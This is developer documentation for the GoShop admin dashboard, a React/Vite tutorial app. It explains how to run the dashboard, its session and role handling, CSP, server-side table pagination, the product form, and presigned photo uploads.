# GoShop admin dashboard

`apps/admin` is where sellers and admins manage GoShop: products, stock, photos, orders and the sales report. It is a Vite + React single-page app, served by Caddy, with the same look, API client and login as the storefront. It arrives in Bab 12; this file has one section per article, like `docs/web/README.md` does for the storefront.

## Running it

```bash
make up                                   # API, database, storage and both web apps
# or, with hot reload, against an API from make up or make dev-api:
pnpm dev:admin                            # http://localhost:5174
```

Log in with a seller or admin account. Locally, `SEED_ADMIN_PASSWORD=… make seed-admin email=admin@goshop.local` creates an admin, and `SEED_ADMIN_PASSWORD=… make seed-admin email=penjual@goshop.local role=seller` a seller, to see what a seller may and may not do (artikel 08). A buyer account can log in too, and sees the "no access" page.

| Setting         | Kind     | Where                                                              | Meaning                                                                                                                                                                       |
| --------------- | -------- | ------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `VITE_API_URL`  | build    | `apps/admin/.env.local`, the Docker build argument, compose `args` | The API as the browser reaches it. Baked into the bundle, so it is public. Unset in development means `http://localhost:8080`; a production build refuses to start without it |
| `PORT`          | run time | container                                                          | Caddy's port (Railway sets it; 8080 otherwise)                                                                                                                                |
| `IMAGE_ORIGIN`  | run time | container                                                          | Origin(s) product photos are shown from (CSP `img-src`)                                                                                                                       |
| `UPLOAD_ORIGIN` | run time | container                                                          | Origin(s) the browser uploads photos to (CSP `connect-src`, artikel 04)                                                                                                       |

The API must allow the dashboard's origin in `APP_CORS_ALLOWED_ORIGINS` (its default includes `http://localhost:5174`). A Railway deployment needs the dashboard on the same registrable domain as the API (custom domains), for the same reason as the storefront: the session cookie (`goshop_admin_refresh` for the dashboard) is `SameSite=Strict` (`docs/configuration.md`).

# Bab 12: the admin dashboard

## Layout dashboard: sidebar, header, breadcrumb (artikel 01)

### The mental model

| Idea                                   | What it means                                                                                                                                                                                                 | Go comparison                                                                |
| -------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| **A second app, not a second section** | The dashboard is its own deployable (`apps/admin`, its own image, its own origin), not `/admin` inside the storefront. Its code, bundle and CSP never reach a buyer, and a storefront deploy never touches it | A second `cmd/` binary in the same module: shared packages, separate process |
| **Layout routes**                      | A route without a path wraps its children in a frame (`DashboardLayout`) or a decision (`RequireStaff`); a page only renders its own content into the `<Outlet />`                                            | Middleware wrapping a group of handlers (`r.Group`)                          |
| **The route table as the one source**  | Each route names itself in `handle.crumb`; the breadcrumb reads them with `useMatches()`                                                                                                                      | Route metadata read by middleware, instead of a second list                  |
| **The UI hides, the API refuses**      | A buyer sees "no access" instead of the dashboard, but that is courtesy: every `/v1/admin` request is checked by the API (`403` for a buyer)                                                                  | Authorisation in the handler, never trusted from the client                  |

### Decisions

- **A Vite SPA, not Next.js.** Bab 11 moved the storefront to Next.js for SEO and the first paint of public pages. The dashboard is behind a login, has nothing for a crawler (`<meta name="robots" content="noindex">` and Caddy's `X-Robots-Tag: noindex`), and is used for hours in one tab, where a client-side app is at its best. So it is exactly the Bab 7–10 storefront's shape: Vite, React Router's data router, TanStack Query, Tailwind v4 with shadcn/ui, served by Caddy.
- **Port 5174.** The storefront owns 5173. `vite.config.ts` sets `strictPort`, so the dev server stops instead of drifting to a port the API's CORS list does not allow. `make up` publishes the container on the same `127.0.0.1:5174`: run one of the two at a time.
- **The storefront's web session, with its own cookie** (Bab 10 artikel 12–14, ADR 0008): `POST /v1/auth/web/login` puts the refresh token in an `HttpOnly` cookie, the access token stays in memory, a reload restores the session with `POST /v1/auth/web/refresh`, every cookie call runs under a Web Lock, and `createAuthClient` refreshes before expiry and once after a `401`. No new endpoint was needed: the dashboard sends `X-GoShop-Client: admin` where the storefront sends `web` (`webLogin(api, body, { client: "admin" })`, and the same for `webRefresh` and `webLogout`, in `features/auth/session-manager.ts`), and the API answers with the cookie `goshop_admin_refresh` instead of `goshop_refresh`.
- **Copied, not shared, for now.** `session-manager.ts`, `auth-client.ts`, `refresh-lock.ts`, `return-to.ts`, `error-message.ts` and `api-form-errors.ts` are copies of the storefront's (the session manager without its guest-cart hook). They would fit `packages/shared`, but moving them means moving their tests too, and `packages/shared` requires 70% coverage per file; that move is a follow-up for both apps at once. What already is shared is used from `@goshop/shared`: the API client with its retries, `webLogin`/`webRefresh`/`webLogout`, `loginSchema`, `ApiError`, and the generated `User` type with its `role`.
- **Two cookies for two apps.** A cookie belongs to the API's host, not to the app that logged in, so with one cookie name the storefront and the dashboard on one browser would share one session: logging in to the dashboard as a seller would replace a buyer's storefront session, logging out of either would log out of both, and a storefront tab and a dashboard tab refreshing at the same moment would present the same token twice (the Web Lock is per origin) and trip the API's reuse detection. The header ends all three: each app has its own cookie, rotated and revoked on its own, and each app's Web Lock only has its own tabs to serialise. Both cookies share a path, so the browser sends both to every web auth call; the API reads only the one the header names. The header is a CSRF defence and a label, not a permission: the role check stays in the API (`403` for a buyer on every `/v1/admin` request), and ADR 0008 discusses what binding each value to its own origins would add.
- **The role gate** (`features/auth/components/RequireStaff.tsx`): one layout route around the whole dashboard decides what renders. While the start-up refresh runs: "Memeriksa sesi Anda…". Nobody logged in: `/masuk?kembali=<the page asked for>`, checked by `safeReturnPath` (no open redirect). A buyer: the "no access" page at whatever URL was asked for, never the dashboard's frame. A seller or an admin: the dashboard. The role comes from the session (`session.user.role`, refreshed with every token). Who counts as staff was `isStaffRole` here; since artikel 08 it is `can(role, "dashboard:view")` in `features/auth/permissions.ts`, the same table that decides what each staff role may do (a seller may not cancel an order).
- **The layout** (`app/DashboardLayout.tsx`), in reading order: skip link, header (`<header>`: the phone menu button, "GoShop Admin", the user menu), sidebar (`<nav aria-label="Menu utama">`: Ringkasan, Produk, Pesanan, Laporan), `<main>` with the breadcrumb and the page. From `md` the sidebar sits beside `<main>`; below it, it folds under the header behind a "Menu" button (`aria-expanded`, `aria-controls`). A disclosure rather than a modal drawer: Radix's Dialog locks scrolling by inserting a `<style>` element, which the CSP (`style-src 'self'`) refuses, the same reason the storefront's menu is non-modal. Following a link folds it again.
- **The sidebar is data** (`app/navigation.ts`): path, label, icon and a one-line description per section. The sidebar renders it, and the overview page renders the same items as cards. Every item is for both staff roles: artikel 08 found no section a seller may not open (the one admin-only action, cancelling an order, is a button on the order's page), so the sidebar filters nothing. An admin-only page, when one exists, gets its item filtered by the same `can` as its route. React Router's `<NavLink>` sets `aria-current="page"`; the active style is written against that attribute (`aria-[current=page]:bg-primary`), so the eye and a screen reader get the same fact. "Ringkasan" uses `end`, or it would be active on every path.
- **Breadcrumbs from the route table** (`app/route-crumbs.ts`, `app/Breadcrumbs.tsx`, shadcn/ui's `Breadcrumb` in `components/ui`). Each route says `handle: { crumb: "Produk" }`; `breadcrumbsFrom(useMatches())` turns the matched routes into steps, outermost first: "Dasbor › Produk". A new page gets its breadcrumb by being added to `routes.tsx`, with no second list to forget. The last step is a `<span aria-current="page">`, not a link to the page already on screen; the separators are `aria-hidden`.
- **Focus after a navigation** (`app/useRouteFocus.ts`): the new page's `<h1>` (every page has one, `tabIndex={-1}`, through `PageHeader`) gets the focus, so a screen reader reads the page's name and Tab continues from there. Unlike the storefront, the hook runs in the root route (`app/AppRoot.tsx`) and finds `<main id="konten">` by id: the dashboard has three frames (the login page, the "no access" page, the dashboard), and a login moves from one to another. Inside one layout, the hook would mount fresh with the new path and see no navigation at all. The login page, the "no access" page and the start-up check share `app/CenteredPage.tsx`, whose `<main>` has the same id.
- **Accessibility**, beyond the above: the skip link ("Langsung ke konten utama") is the first Tab stop; the focus ring is an outline from the design tokens (`:focus-visible`, kept in Windows' forced-colours mode); icons are `aria-hidden` next to visible text; the phone menu button's name stays "Menu" in both states (`aria-expanded` carries the state); the user menu is Radix's (a real button, arrow keys, Escape, the focus back on the trigger); a failed logout is a `role="alert"`, and the user stays logged in rather than looking logged out.
- **Design tokens: the storefront's.** `src/index.css` is the storefront's colour roles, radius, type and spacing, so the two apps look like one product. Dark mode follows the device (Tailwind's own `dark` variant) without the storefront's toggle and its pre-paint script.
- **Code splitting:** only the login page is lazy (`features/auth/lazy.ts`): React Hook Form and Zod are about a fifth of the JavaScript, and a seller who reloads with a live session never needs them. The main bundle is about 155 kB gzipped.
- **Query defaults** (`lib/query-client.ts`): the storefront's (`retry: false`, because the API client already retries what is worth retrying), with a shorter `staleTime`, 10 seconds: orders and stock change under a seller's hands. After a logout, every cached query is removed, so the next person at the browser never sees the last one's orders.

### The container and the CSP

`apps/admin/Dockerfile` and `apps/admin/Caddyfile` are the Bab 7–10 storefront's (`git show bab-10:apps/web/Dockerfile`): pnpm builds the bundle with the repository root as context, Caddy serves it on `$PORT` as a non-root user, `/healthz` answers without touching files, hashed `/assets/*` are cached for a year and a missing one is a plain `404`, every other path falls back to `index.html` with `no-cache`.

The Content-Security-Policy:

```
default-src 'self'; script-src 'self'; style-src 'self';
img-src 'self' data: {$IMAGE_ORIGIN};
connect-src 'self' <API origin> {$UPLOAD_ORIGIN};
object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'
```

Two kinds of origin, two mechanisms:

- **The API's origin is fixed at build time**, because the bundle is: `VITE_API_URL` is a build argument that Vite bakes in, and the Dockerfile writes its origin to `/etc/caddy/api-origin`, which the Caddyfile reads with `{file.…}`. The CSP and the bundle cannot name two different APIs.
- **The storage's origins are read at run time**: `{$IMAGE_ORIGIN}` and `{$UPLOAD_ORIGIN}` are Caddy environment placeholders, replaced when Caddy reads its config at start-up. One image therefore works against any storage, local SeaweedFS or a bucket, by setting two variables, with no rebuild; the bundle never needs them, because the API hands out every photo URL and every presigned upload URL. Unset means empty: photos and uploads are blocked, everything else works. Each value is one or more origins separated by spaces (an operator's setting, never user input). `make up` sets both to the storage as the host sees it (`S3_PRESIGN_ENDPOINT`, default `http://localhost:8333`).

`X-Robots-Tag: noindex, nofollow` joins the storefront's headers. Compose publishes the container on `127.0.0.1:5174`; Railway builds it from `deploy/railway/admin.json` and checks `/healthz`.

## Tabel data dengan TanStack Table: sort, filter, pagination server (artikel 02)

`/produk` is every product of the shop, in any status, as a table that searches, filters, sorts and pages **on the server**, through `GET /v1/admin/products` (backend, same chapter).

### The mental model

| Idea                             | What it means                                                                                                                                                                               | Go comparison                                                       |
| -------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
| **A headless table**             | TanStack Table computes headers, rows, cells, the sort and the page logic; every element on screen is ours (`components/ui/Table.tsx`, shadcn/ui's)                                         | A package that returns data structures, and a template renders them |
| **Manual (server) processing**   | `manualSorting` and `manualPagination`: the table never reorders or slices the 20 rows it gets. It is told the current sort and page, and reports a click as an updater we write to the URL | The handler does `ORDER BY … LIMIT … OFFSET`, not the template      |
| **The URL is the table's state** | Search, filters, sort, page and page size live in the query string (`useProductTableParams`); only the change on its way is held in React state                                             | The request's query parameters, parsed and validated per request    |
| **Key = request**                | The whole API query is the TanStack Query key: a URL change is a key change is a fetch                                                                                                      | A cache keyed by the full query string                              |

The flow of one click: header button → TanStack calls `onSortingChange(updater)` → `functionalUpdate(updater, sorting)` gives `[{ id: "price_from", desc: true }]` (the price column has `sortDescFirst: true`, so the first click sorts from the highest price) → the URL becomes `/produk?urut=harga` (descending is the default, so `arah` is left out) → `readProductTableParams` → `toListAdminProductsQuery` → a new query key → `GET /v1/admin/products?sort=price_from&order=desc&page=1&per_page=20` → the new page is the table's `data`.

### Decisions

- **Why the server sorts, filters and pages.** The browser only ever has one page. Sorting those 20 rows by price would sort _one page_, not the shop; filtering them would hide matches on page 7. Correct answers for "cheapest first" or "everything with low stock" need the whole table, and the whole table lives in PostgreSQL. It also keeps the page light: 20 rows travel, whether the shop has 50 products or 50,000. So every column a seller can sort by is a column the API sorts by (a column's `id` is the API's `sort` value), and the table is told so with `manualSorting`/`manualPagination` and the server's `rowCount`.
- **Why the state is in the URL.** A link to `/produk?status=draf&urut=harga` opens the table exactly so: a seller can bookmark "drafts by price" or send "page 3 of the low-stock list" to a colleague. Back and Forward step through what the seller did (each filter, sort or page is a history entry), and a reload keeps everything. Kept in React state, all three are lost. The URL is the source: `params` is read from it on every render (memoised on the query string), and `update` writes a new query string.
- **The change on its way.** React Router navigates inside a transition, so a new URL reaches the page a moment after the click, as a non-urgent render. A checkbox or select controlled only by the URL is put back to its old value by the click's own render, then flips again when the URL arrives: a flicker to the eye, and Playwright's `check()` reports "did not change its state". `useProductTableParams` therefore also keeps `pending`, the state `update` just asked for, set as an urgent update the controls show at once; the next URL to arrive (this one, or Back, or a link) replaces it, using the same "store what the last render saw" pattern as the search box. `useOptimistic` would express the same idea, but an optimistic value lasts only while the action that set it runs, and `setSearchParams` returns nothing to await: the router applies the new URL a few microtasks later, after that action has ended, so the value would still snap back in between. Several updates in one event (a search and a filter set together) must all count, and `setSearchParams(fn)` cannot promise that: its `fn` is handed the query string of the render that made the setter, so the second update starts from the old URL and drops the first. `update` therefore builds on `latest`, a ref holding the last update's result and the URL state it was made against, while that URL is still current, and on the URL as soon as any other one arrives; it then writes the whole query string. `useReportParams` (artikel 07) does the same.
- **The URL is input, checked like a request.** `readProductTableParams` accepts only what the API accepts and falls back to the default for anything else: `?halaman=-3` is page 1, `?urut=warna` the default sort, `?per_halaman=7` 20 rows, a category that is not a UUID no category. A typed or stale link shows a sensible table instead of a 400. Defaults are left out of the URL (`/produk`, not `/produk?urut=diubah&arah=turun&halaman=1`), and the parameters have a fixed order, so equal states give equal URLs. The names are Indonesian, like the paths and like the storefront's catalog (`q`, `status`, `kategori`, `stok=menipis`, `urut`, `arah`, `halaman`, `per_halaman`); the values are mapped to the API's in one table per parameter (`STATUS_OPTIONS`, `SORT_OPTIONS`).
- **Any change but the page goes back to page 1** (`nextProductTableParams`): page 4 of yesterday's search means nothing for today's. A page past the last one (a stale link, products archived since) is not an error: the API answers an empty page with the real total, and the page offers "Ke halaman N".
- **Why offset pages here and cursors in the catalog.** The storefront's catalog (`GET /v1/products`) is a feed: a buyer scrolls forward, new products arrive at the top while they do, and a cursor keeps "the next 20 after this one" exact with no `COUNT(*)` and no deep `OFFSET`. A data table is the opposite: a seller jumps to page 7, sorts by any of five columns, wants "Halaman 2 dari 5" and the total. Offsets give exactly that; their costs are acceptable here: one shop's product count is small, so `COUNT(*)` and `OFFSET` stay cheap (the API caps `page` at 10,000), and the API breaks ties on `id`, so a page boundary never repeats or skips a product while nothing changes. A product saved by someone else while a seller pages can still move a row across a boundary; for a back-office table, that is the accepted trade.
- **Filters are not TanStack's column filters.** The API filters (name _or_ SKU, a category _with its children_, "some variant at 5 or fewer"), none of which is "this column's value": the table only renders what came back. The filters live in the URL next to the sort and the page, and reach the API through the query key. Registering `columnFilteringFeature` would add a second copy of state the URL already holds.
- **TanStack Table v9** (`@tanstack/react-table`, pinned in the pnpm catalog). v9 includes only the features a table registers (`tableFeatures({ rowSortingFeature, rowPaginationFeature })`), and no row models for them, since the server does that work. The features and the columns are module-level constants (`product-columns.tsx`): TanStack compares them by identity, and new ones on every render would rebuild its models on every render. The table owns no state: `state: { sorting, pagination }` comes from the URL, and `onSortingChange`/`onPaginationChange` write back to it.
- **Sort cycle.** `enableSortingRemoval: false` (a click goes asc ⇄ desc, never "unsorted": the API has no unsorted order) and `enableMultiSort: false` (the API sorts by one column). `sortDescFirst`: the first click on a number or date shows the biggest or newest first, which is what a seller looks for; the name starts at A.
- **Debounced search** (`ProductSearchField`, `hooks/useDebouncedCallback.ts`): the table searches 300 ms after the last key, so "kaos polos" is one or two requests, not ten; Enter searches at once. The box keeps its own text while the seller types and follows the URL only when the URL changes for another reason (Back, "Hapus filter", a shared link). History: starting or clearing a search adds an entry; refining one replaces it, so Back skips "k", "ka", "kao".
- **Loading without jumping.** The first load shows skeleton rows (`components/ui/Skeleton.tsx`) inside a `role="status"` that says "Memuat produk…". After that, `placeholderData: keepPreviousData` keeps the last page on screen while the next one loads: the table dims, its region is `aria-busy`, and the summary says "Memuat produk…". Without it every "Berikutnya" would collapse the table and move the pagination away from the pointer.
- **Empty and error states.** Nothing at all: "Belum ada produk". Nothing for this search or filter: a message and "Hapus filter". An error without a page of products: `ErrorState` with "Coba lagi" (the filters stay usable, and the error code is quoted). A failed refetch in the background (the window regaining the focus, the table invalidated after a save) keeps the rows on screen, still the answer for those filters, with one line saying they could not be updated and a small "Coba lagi", as the order queue does. If the categories fail, only the category filter says so, with its own retry.
- **Accessibility.** A real `<table>` with `<th scope="col">`; a sortable header is a `<button>` inside the `<th>` (Tab, Enter and Space work with no key handler of ours), and the sorted `<th>` carries `aria-sort`; the arrow is `aria-hidden`. A hidden caption names the table and its sort ("Daftar produk, diurutkan menurut Harga mulai naik"). The table scrolls sideways in its own box on a phone, never the page, and that box is a focusable, named region, so a keyboard can scroll it. The summary under the table is a `role="status"`, so a screen reader hears "Menampilkan 21–40 dari 57 produk" after a change. The pagination is a named `<nav>` of icon buttons with screen-reader names; disabled ones leave the Tab order. The thumbnail's `alt` is empty on purpose: the product's name is in the next cell, and a screen reader would otherwise read it twice per row. A missing price is "—" to the eye and "Belum ada harga" to a screen reader. Status and low stock are words in badges, never colour alone.
- **Money and dates.** `formatRupiah` from `@goshop/shared` (whole rupiah, `Rp 89.000`); dates through one `Intl.DateTimeFormat("id-ID")` in the browser's time zone, inside `<time dateTime>`.
- **Bundle.** TanStack Table and the products page bring the main bundle from about 155 kB to about 174 kB gzipped. The page is in the main bundle because it is the dashboard's most used one; splitting it would only move the wait to the first click on "Produk".
- **Where the endpoint function lives: `@goshop/shared`** (`listAdminProducts` in `packages/shared/src/api/admin-products.ts`, with its types in `api/types.ts`). It is a thin, typed mapping of the contract, exactly like `listProducts` beside it, and its types are the generated ones; the session-specific code that was copied in artikel 01 stays copied for the reasons given there. The caller passes `authApi`, because the endpoint is staff only.

## CRUD produk dengan form multi-step (artikel 03)

`/produk/baru` creates a product and `/produk/<id>` edits one, with one form in three steps: **Info dasar** (name, slug, category, status, description) → **Varian & harga** (the variants: SKU, name, price, stock, weight) → **Tinjau** (the product as it will be sent, then save). The table links to both: each product's name opens it, and "Tambah produk" sits beside the page title. The edit page also archives.

### The mental model

| Idea                                  | What it means                                                                                                                                                                                                                                           | Go comparison                                                                  |
| ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| **One form, three screens**           | React Hook Form holds the whole product from the first render; a step only chooses which inputs are on screen. A step that leaves keeps its values, and the save sends what every step collected                                                        | One request struct filled over several screens, sent once                      |
| **One schema, checked per step**      | `productSchema` (`@goshop/shared`) is the resolver. "Lanjut" runs `trigger(fields of this step)`: the same schema, reporting only those fields. The save runs it whole and sends its output                                                             | `validate.Struct` on the body, with the errors filtered by the screen's fields |
| **The schema is the contract**        | Its output type is checked against `ProductWrite`, generated from `api/openapi.yaml` (`satisfies z.ZodType<ProductWrite>`); a contract change that the schema misses is a compile error                                                                 | A struct generated from the spec, and validation tags that mirror it           |
| **The API has the last word**         | Every rule is checked again by the API; its field errors land on their fields, on whichever step they are, and the form goes there                                                                                                                      | The handler validates, whatever the client did                                 |
| **The version travels with the form** | Each loaded variant keeps the `version` it was read with, invisible, and sends it back with `PUT` (since artikel 05 the product's own `version` too). If a buyer took stock in between, the API refuses the save (409) instead of overwriting the stock | Optimistic locking: `UPDATE … WHERE version = $n` (Bab 5, ADR 0006)            |

### Decisions

- **The schema mirrors `ProductWrite` and the handler, rule by rule** (`packages/shared/src/schemas/product.ts`): `category_id`, `slug`, `name`, `status` and `variants` required; the name 1–200 characters, the slug 1–200 and `^[a-z0-9]+(-[a-z0-9]+)*$`, the description at most 5,000 (optional, `""` by default), the status one of `draft`, `active`, `archived`; 1 to 50 variants, each with a SKU (1–64, trimmed and upper-cased first, as the API does), a name (1–100), a price in **whole rupiah** (an integer from 1 to 1,000,000,000; in the response a price is `{amount, currency}`, in the request it is a plain integer), a stock (0–1,000,000) and a weight in grams (1–100,000); no SKU or variant `id` twice; `version` required with an `id`. Lengths count characters the way Go does (code points), and text may not contain NUL, like the address schema. The messages are Indonesian and say what to write, not what is wrong ("Tulis harga dalam rupiah tanpa koma, misalnya 89000 atau 89.000.").
- **Numbers are typed as a seller writes them.** The price, stock and weight inputs are text inputs with `inputMode="numeric"` (the phone's number pad), not `type="number"`, and the schema accepts digits ("89000") or digits in groups of three with dots ("89.000", "1.250.000"), the Indonesian way. Anything else ("89,5", "89.5", "Rp 89000") is refused rather than guessed at: reading "89.5" as 895 or as 89 would put a wrong price on sale. `type="number"` would accept "89.5" as 89.5 and turn a mouse-wheel scroll over a focused field into a new price.
- **Validate late, re-check early.** A step is checked when the seller presses "Lanjut" (or chooses a later step in the indicator, or saves), not while typing and not on blur. A message that appears on blur pushes the form down at the moment the seller clicks the next control, and the click lands on whatever moved under the pointer (removing a variant missed exactly so while this was built). Once a field shows an error, it is checked again on every change (`hooks/useProductField.ts`), so the message disappears as soon as the value is right. After a save attempt every field behaves so (React Hook Form's `reValidateMode`).
- **The slug follows the name** while a new product is written ("Kaos Polos Hitam" → `kaos-polos-hitam`, `toProductSlug` in `@goshop/shared`: accents dropped, any other character a separator, cut at a word boundary), until the seller edits the slug. "Edited" is React Hook Form's `dirtyFields.slug`, which survives a trip to another step and back. Editing an existing product never changes its slug by itself: the slug is the product's address in the storefront.
- **Variants are a field array** (`useFieldArray`, `keyName: "key"` because a variant has an `id` of its own, the API's, which must reach the request untouched). Adding one focuses its SKU; removing one moves the focus to "Tambah varian", since the removed row's button is gone. A product keeps at least one (the API needs one), and at most 50. Each variant is a `<fieldset>` whose `<legend>` ("Varian 2: XL") a screen reader reads before every input in it, so five fields called "Harga" stay distinguishable. In the edit form, removing a variant archives it on save (the contract: it stays in order history, and its SKU stays taken), and the step says so. Artikel 05 builds the stock management and the conflict view on this list.
- **Server errors go where the seller can fix them** (`toProductApiErrors` in `features/products/product-form.ts`). `400 VALIDATION_FAILED` names fields as the body does (`variants[1].price`); React Hook Form calls that `variants.1.price`, so the brackets become dots and each message (translated by `lib/api-form-errors.ts`) is set on its field. The form then goes to the earliest step that has one and focuses its first invalid field in screen order (the API's keys are in alphabetical order, not the form's). `UNKNOWN_CATEGORY` lands on the category, `SLUG_TAKEN` on the slug, `SKU_TAKEN` above the variant list (the API does not say which SKU, and also refuses swapping two variants' SKUs in one save, so the message says so), and anything else above the buttons as a focused `role="alert"`.
- **409 VERSION_CONFLICT is told plainly.** In this article the way out was one button, "Muat ulang data terbaru", which refetched the product and remounted the form from it, losing the seller's edits on purpose: merging them into newer data needs to show what changed. Artikel 05 replaces the button with that: every 409 of a save opens `ProductConflictReview`, which shows what changed on the server next to the seller's changes and lets them keep their changes on top of the latest data or drop them. The button is no longer in the code.
- **After saving.** A new product goes to its own page, `/produk/<id>`, not back to the table: the next thing a new product needs is its photos, and a photo can only belong to a product that exists (artikel 04 adds them to that page, which is also why photos are not a step). The navigation uses `replace`, so Back goes to the table instead of an empty "new product" form, and a reload shows the product instead of creating it twice. An edit stays on the page: the form resets itself to the saved product (no longer "dirty", and holding the variants' new versions for the next save) and a `role="status"` line says it is saved. Either way, the saved product goes straight into its detail query (`setQueryData`: the API answered with it) and every page of the table is invalidated (`["admin", "products", "table"]`), so the table shows the new name or price the next time it is on screen.
- **The edit form does not overwrite what is being typed.** In this article it took the product once, when it mounted, and started over only when the page asked (after a 409 reload and after archiving), so the versions it held stayed the ones the seller started from, which is what makes the 409 honest. Artikel 05 replaces "once, when it mounted": a form with no changes now follows the query's product (versions included), and a form with changes keeps them and says the server moved. A background refetch (the window regaining focus) still never overwrites a change. The form starts over by itself only after archiving.
- **Archiving** (`DELETE`, "Arsipkan" beside the title, hidden for an archived product) asks first, in a dialog that says what happens and what does not: the product leaves the storefront, nothing is deleted, orders keep it, saving it again with Aktif or Draf restores it, and unsaved changes in the form are dropped. The dialog is the browser's own `<dialog>` with `showModal()` (`components/ui/ConfirmDialog.tsx`), `role="alertdialog"`, named by its title and described by its text: the page behind becomes inert, Escape cancels, the focus starts on "Batal" (Enter on a dialog that just appeared must not archive anything) and returns to the button that opened it. Radix's AlertDialog was not used for the reason the menu is not a Radix Dialog (artikel 01): it locks scrolling with an inline `<style>` that the CSP refuses. A failed archive stays in the dialog, as an alert, so it can be retried.
- **Unsaved changes** (`hooks/useUnsavedChangesGuard.ts`). Inside the app (a sidebar link, the breadcrumb, Back), React Router's `useBlocker` holds the navigation while the form is dirty and the same dialog asks "Tinggalkan halaman ini?" ("Tetap di sini" has the focus). A search parameter on the same page is not leaving. Out of the app (closing the tab, a reload), only the browser can ask, through `beforeunload`; its text cannot be chosen. That listener exists only while there is something to lose, because any `beforeunload` listener keeps the page out of the back/forward cache. A successful create allows the navigation that follows it (the form is still "dirty" until the next render, but nothing would be lost).
- **The step indicator** (`StepIndicator.tsx`) is an ordered list of buttons in a named `<nav>`: the current step has `aria-current="step"` (and the style is written against it), a finished one a check mark and "selesai" for a screen reader. Choosing a later step validates the steps on the way, so it is never a way around them. Each step's `<h2>` gets the focus when the step changes (a screen reader reads "Varian & harga", and Tab continues from there; "Langkah 2 dari 3" is the line under it), or the first invalid field does when the step changed because of an error. Enter in a field is "Lanjut" on the first two steps and "Simpan" on the last.
- **The review step shows the schema's output**, not the raw inputs: "89.000" is already Rp 89.000 and " kph-m " already `KPH-M`, so the seller checks what the shop will hold. Each part has "Ubah", back to its step.
- **Field components.** `TextField` already tied an input to its label, hint and error; `components/ui/Field.tsx` does the same for any control (the category and status `<select>`, the description `<textarea>`) through a render prop that hands over the ids. The category `<select>` is controlled by the form's value, because its options arrive after it is on screen and a select only shows a value it has an option for.
- **Code splitting.** The two form pages are lazy routes (`features/products/lazy.ts`), like the login page: React Hook Form, Zod and the form are about 50 kB gzipped that a seller who only looks at the table never downloads. Without it, the main bundle grew from about 174 kB to 222 kB gzipped.
- **Where the endpoint functions live: `@goshop/shared`** (`getAdminProduct`, `createProduct`, `updateProduct`, `archiveProduct` beside `listAdminProducts`), with the generated types `AdminProduct`, `AdminVariant`, `ProductWrite` and `VariantWrite`, and the schema next to the address and voucher schemas, ready for the mobile app.

## Upload gambar dengan presigned URL dan preview (artikel 04)

The edit page (`/produk/<id>`) gets a **Foto produk** section under the form: the product's photos, a "Pilih foto" button with a drop area, and every upload on its way, each with its preview, its progress and its own error. The backend flow exists since Bab 6 (ADR 0007): this article is the browser's half of it.

### The mental model

| Idea                               | What it means                                                                                                                                                                                                            | Go comparison                                                             |
| ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------- |
| **Presigned direct upload**        | The API never sees the file. It records a pending photo and signs one `PUT` to the storage (15 minutes, exactly this type and size); the browser sends the bytes there, then tells the API "it is there" (confirm)       | `minio.PresignedPutObject`: a URL that carries its own permission         |
| **Three requests, one upload**     | `POST …/images/uploads` (pending photo + URL) → `PUT <url>` (the file, to the storage) → `POST …/images/{id}/confirm` (the API checks what arrived; the photo is `processing`). Then the worker makes the sizes: `ready` | A saga of three steps; each one can fail on its own and resume from there |
| **Check early, the API decides**   | The browser checks size, type and pixels before uploading, so "too big" takes a second instead of an upload; the API checks everything again at confirm                                                                  | Validation in the client for speed, in the handler for truth              |
| **Two sources, one grid**          | The photos the API has come from the product's query; the uploads in progress from local state. They are merged by image ID (`photoTiles`)                                                                               | Joining a table with an in-memory map                                     |
| **Polling with a bounded backoff** | While a photo is `processing`, the product is fetched again after 1, 2, 3, 5, then every 8 seconds, for at most two minutes                                                                                              | A `time.Ticker` whose period grows, inside a `context.WithTimeout`        |

One file's life: `checking` (in the browser) → `queued` (two upload at once) → `starting` (POST uploads) → `uploading` (PUT, with a progress bar) → `confirming` (POST confirm) → `confirmed` (the API's photo is `processing`; the local preview stays) → the API says `ready`: the upload is forgotten, its object URL revoked, and the tile shows the API's 400/800 px JPEGs. A refused file is `rejected` and never leaves the browser; a failed step is `failed`, and "Coba lagi" continues from that step.

### Decisions

- **Why presigned direct upload, not a multipart POST to the API.** A 5 MB photo through the API would hold a request, a connection and memory for every byte, on the service that also answers checkouts. With a presigned URL the storage does what it is built for, and the API only does what needs it: deciding who may upload what (a seller, this product, at most 10 photos, JPEG/PNG/WebP up to 5 MiB, signed into the URL), and checking the result before the storefront shows it. The signature covers `Content-Type` and `Content-Length`, so the URL cannot be used for another type or a bigger file; it is useless after 15 minutes.
- **Why XMLHttpRequest for the upload** (`upload-to-storage.ts`). `fetch` has no upload progress: its `Response` streams the answer, not the request. A streaming request body (`duplex: "half"`) could count bytes, but it needs HTTP/2, and it is sent without a `Content-Length`, which S3 refuses and which is signed here. `xhr.upload.onprogress` reports the bytes sent, on every browser, and `xhr.abort()` is the cancel button. The request is exactly the presigned one: its method, its URL, its headers, the file as the whole body. `Content-Length` is in the API's header list because it is signed, but a page may not set it (the browser does, from the body, and it is the declared size), so it is skipped. No `Authorization` goes to the storage: the URL is the permission, and the API's token stays with the API. An S3 error is a small XML document; `<Code>AccessDenied</Code>` with "Request has expired" (or a clock past `expires_at`) is told apart as "expired", because the fix is different: a new URL.
